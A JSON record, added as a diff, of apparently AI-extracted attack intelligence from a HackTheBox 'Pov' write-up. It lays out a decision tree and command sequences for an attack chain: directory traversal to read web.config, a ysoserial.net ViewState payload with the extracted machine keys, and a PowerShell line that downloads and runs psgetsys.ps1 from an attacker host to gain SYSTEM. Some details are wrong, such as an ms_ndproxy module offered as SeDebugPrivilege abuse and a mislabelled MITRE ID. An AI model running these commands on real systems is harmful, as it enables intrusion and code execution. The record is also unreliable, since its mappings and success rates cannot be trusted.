@@ -1,0 +1,890 @@
+{
+  "writeup_id": "Htb_Pov",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_iis_aspnet_viewstate_deserialization",
+    "primary_services": [
+      "http",
+      "iis"
+    ],
+    "port_signature": "80",
+    "service_combination": "iis+aspnet",
+    "os_family": "windows_server",
+    "environment_type": "web_application",
+    "entry_vector": "viewstate_deserialization",
+    "privilege_path": "web_shell_to_sedebugprivilege_escalation",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "aspnet_viewstate_secrets_readable",
+      "directory_traversal_vulnerability",
+      "sedebugprivilege_enabled",
+      "ysoserial_net_payload"
+    ],
+    "environmental_clues": [
+      "microsoft_iis_10_server",
+      "aspnet_powered_application",
+      "single_web_port_exposed",
+      "subdomain_enumeration_required"
+    ],
+    "similar_scenarios": [
+      "arkham_htb_medium",
+      "json_htb_medium"
+    ],
+    "unique_aspects": [
+      "file_read_to_viewstate_secrets",
+      "psgetsys_powershell_escalation",
+      "portfolio_web_application"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "ASP.NET ViewState Deserialization",
+        "success_reason": "Application used insecure ViewState configuration with accessible machine keys",
+        "prerequisite_indicators": [
+          "asp_net_application_present",
+          "viewstate_enabled",
+          "machine_keys_accessible",
+          "file_read_vulnerability_exists"
+        ],
+        "recognition_patterns": [
+          "X-Powered-By: ASP.NET header",
+          "__doPostBack JavaScript functions",
+          "__VIEWSTATE parameters in forms",
+          "web.config file accessible"
+        ],
+        "failure_modes": [
+          "viewstate_mac_enabled_with_strong_keys",
+          "machine_keys_not_accessible",
+          "no_file_read_vulnerability",
+          "viewstate_disabled"
+        ],
+        "environmental_factors": [
+          "default_asp_net_configuration",
+          "weak_file_permissions",
+          "directory_traversal_possible",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "Directory Traversal to File Read",
+        "success_reason": "Web application failed to properly validate file paths in download functionality",
+        "prerequisite_indicators": [
+          "file_download_functionality",
+          "user_controlled_file_parameters",
+          "insufficient_path_validation",
+          "web_server_file_access"
+        ],
+        "recognition_patterns": [
+          "download parameters in requests",
+          "file path manipulation possible",
+          "../ sequences not filtered",
+          "system files accessible"
+        ],
+        "failure_modes": [
+          "proper_path_validation",
+          "whitelist_file_access_only",
+          "sandboxed_file_operations",
+          "no_system_file_access"
+        ],
+        "environmental_factors": [
+          "weak_input_sanitization",
+          "default_web_server_permissions",
+          "legacy_application_code",
+          "insufficient_security_testing"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "SeDebugPrivilege Escalation",
+        "success_reason": "Service account had SeDebugPrivilege which allows process manipulation",
+        "prerequisite_indicators": [
+          "service_account_access",
+          "sedebugprivilege_assigned",
+          "windows_target_system",
+          "process_manipulation_possible"
+        ],
+        "recognition_patterns": [
+          "whoami /priv shows SeDebugPrivilege",
+          "service account context",
+          "windows privilege enumeration",
+          "process injection capabilities"
+        ],
+        "failure_modes": [
+          "sedebugprivilege_not_assigned",
+          "privilege_restrictions_enforced",
+          "edr_process_monitoring",
+          "privilege_escalation_blocked"
+        ],
+        "environmental_factors": [
+          "default_service_account_privileges",
+          "insufficient_privilege_hardening",
+          "legacy_windows_configuration",
+          "weak_access_controls"
+        ],
+        "success_probability": 0.91,
+        "typical_timeframe": "10-20 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "ASP.NET machine keys in web.config",
+        "discovery_method": "Directory traversal via download functionality",
+        "why_critical": "Enabled ViewState deserialization attack leading to RCE",
+        "how_to_recognize": [
+          "web.config file accessible",
+          "machineKey section present",
+          "validationKey and decryptionKey values",
+          "ViewState MAC validation weak"
+        ],
+        "follow_up_actions": [
+          "extract_machine_keys",
+          "craft_ysoserial_payload",
+          "inject_malicious_viewstate",
+          "achieve_code_execution"
+        ]
+      },
+      {
+        "discovery": "PowerShell credential object",
+        "discovery_method": "File system enumeration after initial access",
+        "why_critical": "Provided lateral movement to privileged account",
+        "how_to_recognize": [
+          "powershell credential files",
+          "encrypted credential objects",
+          "service account credentials",
+          "stored authentication data"
+        ],
+        "follow_up_actions": [
+          "decrypt_credential_object",
+          "test_credential_validity",
+          "enumerate_account_privileges",
+          "escalate_via_sedebugprivilege"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_application_user",
+        "escalation_method": "ViewState_Deserialization_to_System",
+        "why_possible": "ASP.NET application ran with high privileges and weak ViewState security",
+        "recognition_signs": [
+          "asp_net_application_present",
+          "viewstate_parameters_visible",
+          "machine_keys_discoverable",
+          "file_read_vulnerability"
+        ],
+        "exploitation_path": "Directory Traversal → Machine Keys → ViewState Payload → RCE"
+      },
+      {
+        "privilege_level": "service_account",
+        "escalation_method": "SeDebugPrivilege_to_System",
+        "why_possible": "Service account had SeDebugPrivilege allowing process manipulation",
+        "recognition_signs": [
+          "sedebugprivilege_enabled",
+          "process_injection_possible",
+          "system_process_access",
+          "privilege_escalation_tools_available"
+        ],
+        "exploitation_path": "Credential Discovery → SeDebugPrivilege → Process Injection → SYSTEM"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Only port 80 open on Windows host with IIS/ASP.NET",
+        "decision": "Focus on web application vulnerabilities and ASP.NET specific attacks",
+        "reasoning": "Limited attack surface requires deep web app analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "subdomain_enumeration",
+            "when": "if main site has limited functionality"
+          },
+          {
+            "option": "directory_brute_force",
+            "when": "to find hidden endpoints"
+          }
+        ],
+        "success_indicators": [
+          "subdomains_found",
+          "aspx_pages_discovered",
+          "viewstate_parameters_present"
+        ],
+        "next_decision": "analyze_asp_net_components"
+      },
+      {
+        "step": 2,
+        "situation": "Found dev subdomain with ASP.NET application and file download functionality",
+        "decision": "Test for directory traversal in file download feature",
+        "reasoning": "File download functions often vulnerable to path traversal",
+        "confidence": 0.85,
+        "prerequisites": [
+          "file_download_functionality_identified",
+          "asp_net_application_confirmed"
+        ],
+        "success_indicators": [
+          "directory_traversal_successful",
+          "sensitive_files_accessible"
+        ],
+        "failure_fallbacks": [
+          "viewstate_analysis",
+          "asp_net_config_enumeration"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Directory traversal successful, can read arbitrary files",
+        "decision": "Target ASP.NET machine keys and web.config files",
+        "reasoning": "Machine keys enable VIEWSTATE deserialization attacks",
+        "confidence": 0.95,
+        "prerequisites": [
+          "directory_traversal_working"
+        ],
+        "success_indicators": [
+          "machine_keys_extracted",
+          "viewstate_validation_key_found"
+        ],
+        "next_decision": "prepare_viewstate_deserialization"
+      },
+      {
+        "step": 4,
+        "situation": "Machine keys obtained from web.config",
+        "decision": "Use ysoserial.net to create malicious VIEWSTATE payload",
+        "reasoning": "Known machine keys allow VIEWSTATE tampering for RCE",
+        "confidence": 0.9,
+        "prerequisites": [
+          "machine_keys_available",
+          "viewstate_present_on_pages"
+        ],
+        "tools": [
+          "ysoserial.net"
+        ],
+        "success_indicators": [
+          "payload_generated",
+          "viewstate_accepted",
+          "code_execution_achieved"
+        ],
+        "next_decision": "establish_persistent_access"
+      }
+    ],
+    "branching_logic": {
+      "if_directory_traversal_succeeds": {
+        "action": "enumerate_sensitive_files",
+        "targets": [
+          "web.config",
+          "machine.config",
+          "connectionStrings.config"
+        ],
+        "next_phase": "viewstate_exploitation"
+      },
+      "if_machine_keys_found": {
+        "action": "generate_viewstate_payload",
+        "tools": [
+          "ysoserial.net"
+        ],
+        "payload_type": "TypeConfuseDelegate",
+        "next_phase": "remote_code_execution"
+      },
+      "if_code_execution_achieved": {
+        "action": "enumerate_credentials_and_privileges",
+        "tools": [
+          "powershell",
+          "whoami"
+        ],
+        "next_phase": "privilege_escalation"
+      },
+      "if_sedebugprivilege_found": {
+        "action": "exploit_sedebug_for_system",
+        "tools": [
+          "metasploit",
+          "psgetsys.ps1"
+        ],
+        "next_phase": "system_access"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_file_operations_for_traversal",
+        "reasoning": "high_success_rate_in_web_applications",
+        "applicability": "any_file_download_or_upload_functionality"
+      },
+      {
+        "rule": "prioritize_asp_net_config_files_when_traversal_found",
+        "reasoning": "machine_keys_enable_powerful_deserialization_attacks",
+        "applicability": "asp_net_applications_with_directory_traversal"
+      },
+      {
+        "rule": "check_sedebugprivilege_immediately_after_initial_access",
+        "reasoning": "direct_path_to_system_level_access",
+        "applicability": "windows_environments_with_user_access"
+      },
+      {
+        "rule": "use_viewstate_deserialization_when_machine_keys_available",
+        "reasoning": "reliable_rce_method_for_asp_net",
+        "applicability": "asp_net_with_known_machine_keys"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "ASP.NET ViewState Deserialization",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "asp_net_application",
+          "viewstate_enabled",
+          "machine_key_accessible",
+          "file_read_vulnerability"
+        ],
+        "success_indicators": [
+          "viewstate_parameter_present",
+          "machine_key_extracted",
+          "ysoserial_payload_accepted"
+        ],
+        "incompatible_with": [
+          "viewstate_disabled",
+          "machine_key_inaccessible",
+          "input_validation_strict"
+        ],
+        "confidence_boosters": [
+          "web_config_readable",
+          "directory_traversal_exists",
+          "asp_net_version_vulnerable"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "30-60 minutes"
+      },
+      {
+        "technique": "Directory Traversal",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "file_parameter_exists",
+          "path_validation_weak"
+        ],
+        "success_indicators": [
+          "system_files_readable",
+          "config_files_accessible",
+          "sensitive_data_exposed"
+        ],
+        "incompatible_with": [
+          "path_validation_strict",
+          "chroot_jail_enabled",
+          "file_access_restricted"
+        ],
+        "confidence_boosters": [
+          "file_download_functionality",
+          "relative_paths_accepted",
+          "error_messages_verbose"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "SeDebugPrivilege Abuse",
+        "mitre_id": "T1134.001",
+        "required_services": [
+          "winrm",
+          "rdp",
+          "smb"
+        ],
+        "required_ports": [
+          5985,
+          5986,
+          3389,
+          445
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "user_has_sedebugprivilege",
+          "privilege_enabled",
+          "target_process_accessible"
+        ],
+        "success_indicators": [
+          "whoami_shows_sedebugprivilege",
+          "process_injection_successful",
+          "system_token_acquired"
+        ],
+        "incompatible_with": [
+          "privilege_not_assigned",
+          "process_protection_enabled",
+          "antivirus_blocking"
+        ],
+        "confidence_boosters": [
+          "service_account_context",
+          "developer_workstation",
+          "legacy_windows_version"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "10-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "asp_net_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "ASP.NET",
+          "X-Powered-By: ASP.NET"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_server": {
+        "port_indicators": [
+          80,
+          135,
+          139,
+          445,
+          3389,
+          5985
+        ],
+        "service_indicators": [
+          "http",
+          "smb",
+          "winrm",
+          "rdp"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "Windows Server",
+          "Microsoft Windows"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "directory_traversal",
+          "when": "web_service_detected",
+          "reason": "often_leads_to_config_file_access"
+        },
+        {
+          "attack": "asp_net_viewstate_deserialization",
+          "when": "asp_net_detected_and_file_read_available",
+          "reason": "high_impact_code_execution"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "sedebugprivilege_abuse",
+          "when": "windows_access_obtained",
+          "reason": "reliable_privilege_escalation"
+        },
+        {
+          "attack": "web_directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "discovers_hidden_functionality"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "ASP.NET ViewState Deserialization",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "ysoserial.net",
+            "command_template": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"{command}\" --path=\"{path}\" --apppath=\"{apppath}\" --decryptionalg=\"{alg}\" --decryptionkey=\"{key}\" --validationalg=\"{valg}\" --validationkey=\"{vkey}\"",
+            "actual_command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"powershell -e {base64_payload}\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"74477CEBDD09D66A93D5F110D5D4D78EC5E98B0C\" --validationalg=\"HMACSHA256\" --validationkey=\"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\"",
+            "output_pattern": "Base64 encoded ViewState payload",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "asp_net_application_accessible",
+          "viewstate_secrets_readable",
+          "directory_traversal_vulnerability",
+          "web_config_file_accessible"
+        ],
+        "success_indicators": [
+          "web_config_file_read_successfully",
+          "viewstate_secrets_extracted",
+          "malicious_payload_executes",
+          "reverse_shell_obtained"
+        ],
+        "common_failures": [
+          "secrets_not_accessible",
+          "payload_encoding_issues",
+          "network_connectivity_blocked",
+          "antivirus_detection"
+        ],
+        "follow_up_techniques": [
+          "credential_harvesting",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Directory Traversal via File Read",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST -d \"file=../../../{target_file}\" {url}",
+            "actual_command": "curl -X POST -d \"file=../../../windows/system32/drivers/etc/hosts\" http://dev.pov.htb/portfolio/",
+            "output_pattern": "File contents in response",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "burp_suite",
+            "command_template": "POST request with file parameter traversal",
+            "actual_command": "file=../../../web.config",
+            "success_factors": [
+              "vulnerable_file_parameter",
+              "insufficient_input_validation"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "file_parameter_identified",
+          "insufficient_input_validation",
+          "web_application_accessible"
+        ],
+        "success_indicators": [
+          "sensitive_files_readable",
+          "configuration_files_accessed",
+          "credentials_or_secrets_exposed"
+        ],
+        "common_failures": [
+          "path_restrictions_enforced",
+          "file_not_found",
+          "insufficient_permissions"
+        ],
+        "follow_up_techniques": [
+          "credential_extraction",
+          "configuration_analysis",
+          "further_enumeration"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SeDebugPrivilege Abuse",
+        "mitre_id": "T1134.001",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "psgetsys.ps1",
+            "command_template": "IEX(New-Object Net.WebClient).downloadString('{url}/psgetsys.ps1')",
+            "actual_command": "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/psgetsys.ps1')",
+            "output_pattern": "SYSTEM shell obtained",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "metasploit",
+            "command_template": "use exploit/windows/local/ms_ndproxy; set SESSION {id}; run",
+            "actual_command": "use exploit/windows/local/ms_ndproxy; set SESSION 1; run",
+            "success_factors": [
+              "sedebugprivilege_enabled",
+              "vulnerable_windows_version"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "sedebugprivilege_assigned",
+          "user_account_compromised",
+          "powershell_access_available"
+        ],
+        "success_indicators": [
+          "system_level_access_obtained",
+          "privilege_escalation_successful",
+          "administrative_rights_confirmed"
+        ],
+        "common_failures": [
+          "privilege_not_enabled",
+          "detection_by_security_software",
+          "script_execution_blocked"
+        ],
+        "follow_up_techniques": [
+          "persistence_establishment",
+          "credential_dumping",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "ysoserial.net",
+        "use_case": "asp_net_deserialization_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.9,
+        "learning_curve": "medium",
+        "essential_for": [
+          "asp_net_applications"
+        ],
+        "alternatives": [
+          "custom_serialization_payloads",
+          "other_ysoserial_variants"
+        ],
+        "best_practices": [
+          "extract_viewstate_secrets_first",
+          "test_payload_locally_when_possible",
+          "use_appropriate_gadget_chains",
+          "encode_commands_properly"
+        ]
+      },
+      {
+        "tool": "psgetsys.ps1",
+        "use_case": "sedebugprivilege_escalation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "windows_privilege_escalation"
+        ],
+        "alternatives": [
+          "metasploit_modules",
+          "manual_token_manipulation"
+        ],
+        "best_practices": [
+          "verify_sedebugprivilege_first",
+          "ensure_powershell_execution_policy_allows",
+          "test_in_isolated_environment"
+        ]
+      },
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.88,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "wfuzz"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists_for_technology",
+          "include_relevant_file_extensions",
+          "adjust_thread_count_for_target_stability"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "asp_net_viewstate_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST -d \"file=../../../web.config\" http://dev.pov.htb/portfolio/",
+            "purpose": "Extract ASP.NET configuration and ViewState secrets",
+            "expected_output": "Web.config contents with machineKey section"
+          },
+          {
+            "step": 2,
+            "command": "ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"powershell -e [base64_payload]\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"[extracted_key]\" --validationalg=\"HMACSHA256\" --validationkey=\"[extracted_validation_key]\"",
+            "purpose": "Generate malicious ViewState payload",
+            "expected_output": "Base64 encoded malicious ViewState"
+          },
+          {
+            "step": 3,
+            "command": "curl -X POST -d \"__VIEWSTATE=[malicious_payload]\" http://dev.pov.htb/portfolio/default.aspx",
+            "purpose": "Execute malicious ViewState payload",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "45-90 minutes"
+      },
+      {
+        "sequence_name": "sedebugprivilege_escalation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "whoami /priv",
+            "purpose": "Verify SeDebugPrivilege is available",
+            "expected_output": "SeDebugPrivilege listed in privileges"
+          },
+          {
+            "step": 2,
+            "command": "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/psgetsys.ps1')",
+            "purpose": "Download and execute privilege escalation script",
+            "expected_output": "SYSTEM level shell obtained"
+          },
+          {
+            "step": 3,
+            "command": "whoami",
+            "purpose": "Confirm privilege escalation success",
+            "expected_output": "nt authority\\system"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "10-15 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Pov",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2024-01-27",
+      "author": "d00msl4y3r",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "deserialization",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "directory_traversal",
+        "viewstate_deserialization",
+        "sedebugprivilege"
+      ],
+      "environment_type": "windows_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "aspnet_viewstate_attacks",
+        "ysoserial_exploitation",
+        "windows_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_security",
+        "dotnet_serialization",
+        "windows_privileges"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "deserialization_attacks",
+        "privilege_escalation",
+        "file_disclosure"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation",
+        "credential_access"
+      ],
+      "defensive_lessons": [
+        "secure_viewstate_configuration",
+        "file_access_controls",
+        "privilege_auditing"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Json",
+        "Arkham",
+        "Jeeves"
+      ],
+      "similarity_reasons": [
+        "dotnet_deserialization",
+        "web_to_system",
+        "windows_privilege_escalation"
+      ],
+      "unique_aspects": [
+        "viewstate_exploitation",
+        "sedebugprivilege_abuse",
+        "ysoserial_payload"
+      ],
+      "difficulty_factors": [
+        "complex_deserialization_chain",
+        "privilege_escalation_techniques",
+        "dotnet_knowledge_required"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T02:04:19.768911",
+    "original_file": "0xdf_writeups/Htb Pov.md",
+    "content_length": 52338,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
